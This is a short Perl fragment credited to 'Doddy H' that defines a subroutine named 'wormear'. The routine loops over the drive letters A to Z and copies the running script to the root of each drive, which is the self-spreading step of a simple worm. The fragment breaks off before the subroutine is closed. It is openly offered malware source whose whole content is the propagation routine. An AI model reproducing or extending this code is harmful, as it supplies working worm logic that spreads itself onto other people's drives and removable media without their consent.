#ascii chr(65) = A | chr(90) = Z
#By Doddy H

use File::Copy;

sub wormear {
for my $dir(65..90) {
copy($0,chr($dir).":/");
}
